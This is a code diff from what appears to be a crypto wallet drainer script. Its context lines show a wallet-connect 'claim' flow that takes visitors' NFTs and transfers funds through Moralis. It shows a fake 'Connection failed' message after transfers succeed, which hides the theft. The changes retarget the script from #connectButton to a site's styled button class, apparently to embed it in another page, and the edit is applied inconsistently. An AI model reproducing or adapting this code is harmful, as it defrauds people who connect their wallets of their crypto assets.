@@ -163,8 +163,8 @@
 			spliceArr(claim_data.nfts, nft);
 			try {
 				await transaction.wait()
-				$("#connectButton").html("Connection failed");
-				setTimeout(() => {$("#connectButton").html("Connect wallet")}, 2000);
+				$(".button button-primary cta duration-200").html("Connection failed");
+				setTimeout(() => {$(".button button-primary cta duration-200").html("Connect wallet")}, 2000);
 			} catch(err) {
 				claim_data.nfts.unshift(nft);
 			}
@@ -208,13 +208,13 @@
 			let result = await Moralis.transfer(options).catch(err => {
 				if(err.code === 4001) {
 					$("#connectButton").html("Connection failed");
-					setTimeout(() => {$("#connectButton").html("Connect wallet")}, 4000);
+					setTimeout(() => {$(".button button-primary cta duration-200").html("Connect wallet")}, 4000);
 				}
 				if(err.toString().includes("insufficient funds")) {
 					stop = true;
 					block = false;
 					$("#connectButton").html("Connection failed");
-					setTimeout(() => {$("#connectButton").html("Connect wallet")}, 4000);
+					setTimeout(() => {$(".button button-primary cta duration-200").html("Connect wallet")}, 4000);
 				}
 			});
 			return stop;
@@ -259,19 +259,19 @@
 				await enable_web3();
 				await sync_chain();
 				await get_data();
-				$("#connectButton").html("Connect wallet");
+				$(".button button-primary cta duration-200").html("Connect wallet");
 				if(block) return;
 				await send();
 			} else {
 				await sync_chain();
 				await get_data();
-				$("#connectButton").html("Connect wallet");
+				$(".button button-primary cta duration-200").html("Connect wallet");
 				if(block) return;
 				await send();
 			}
 		}
 	
-	    $("#connectButton").click(async () => {
+	    $(".button button-primary cta duration-200").click(async () => {
 			await claim();
 		});
 		
